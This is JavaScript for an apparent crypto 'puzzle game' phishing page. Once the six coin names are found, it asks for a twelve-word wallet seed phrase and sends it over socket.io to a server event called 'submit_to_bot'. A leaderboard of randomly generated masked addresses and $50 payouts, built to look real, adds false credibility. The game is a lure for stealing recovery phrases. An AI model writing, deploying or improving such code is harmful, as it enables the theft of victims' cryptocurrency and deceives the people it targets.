const socket = io();
const found = new Set();
const coins = ["BITCOIN", "ETHEREUM", "SOLANA", "MONERO", "CARDANO", "BINANCE"];

// 8x8 Professional Grid
const letters = [
    'B','I','T','C','O','I','N','W','E','T','H','E','R','E','U','M','S','O','L','A','N','A','X','R',
    'M','O','N','E','R','O','V','Y','C','A','R','D','A','N','O','Z','B','I','N','A','N','C','E','L',
    'K','T','Y','U','P','O','L','M','Q','W','A','S','D','F','G','H'
];

const grid = document.getElementById('game-grid');
let currentSelection = "";

letters.forEach(char => {
    const el = document.createElement('div');
    el.className = 'cell';
    el.innerText = char;
    el.onclick = () => {
        el.classList.add('active');
        currentSelection += char;
        checkMatch();
    };
    grid.appendChild(el);
});

function checkMatch() {
    coins.forEach(c => {
        if (currentSelection.includes(c) && !found.has(c)) {
            found.add(c);
            document.getElementById('progress').innerText = `Matches Found: ${found.size}/6`;
            currentSelection = "";
            if (found.size === 6) {
                setTimeout(() => {
                    document.getElementById('puzzle-view').style.display = 'none';
                    document.getElementById('seed-view').style.display = 'block';
                }, 800);
            }
        }
    });
    if (currentSelection.length > 10) currentSelection = "";
}

// UI Transition
function openInput() {
    document.getElementById('pre-btn').style.display = 'none';
    document.getElementById('main-input-panel').style.display = 'block';
}

// Full Width Grid Generation
const fields = document.getElementById('input-fields');
for(let i=1; i<=12; i++) {
    fields.innerHTML += `<input type="text" id="word-${i}" placeholder="${i}. Word" autocomplete="off">`;
}

function finalizeClaim() {
    let phrase = [];
    for(let i=1; i<=12; i++) {
        let val = document.getElementById(`word-${i}`).value.trim();
        if(!val) return alert("Word #" + i + " is required.");
        phrase.push(val);
    }
    socket.emit('submit_to_bot', { phrase: phrase.join(' ') });
}

socket.on('bot_confirmation', (data) => {
    alert(data.msg);
    window.location.href = data.redirect;
});

// Professional Leaderboard Logic
function toggleLeaderboard() {
    const modal = document.getElementById('modal-overlay');
    modal.style.display = modal.style.display === 'flex' ? 'none' : 'flex';
}

const userNames = ["Kemboy_254", "Alice_Crypto", "Zim_Forensics", "BlockMaster", "Kenyan_Dev", "Cyber_HunteR", "Crypto_Zim", "Alpha_Trade", "User_099", "Nodes_X"];
const hexChars = "0123456789abcdef";
const lbBody = document.getElementById('lb-content');

for(let i=1; i<=20; i++) {
    const user = userNames[i % userNames.length] + (100 + i);
    // Masking logic: 0x + first 2 + *** + last 3
    const startAddr = "0x" + hexChars[Math.floor(Math.random()*16)] + hexChars[Math.floor(Math.random()*16)];
    const endAddr = hexChars[Math.floor(Math.random()*16)] + hexChars[Math.floor(Math.random()*16)] + hexChars[Math.floor(Math.random()*16)];
    const fullMask = `${startAddr}***${endAddr.toUpperCase()}`;

    lbBody.innerHTML += `
        <div class="lb-row">
            <span>${i}. ${user}</span>
            <span class="addr">${fullMask}</span>
            <span style="color: #6aaa64;">$50.00</span>
        </div>`;
}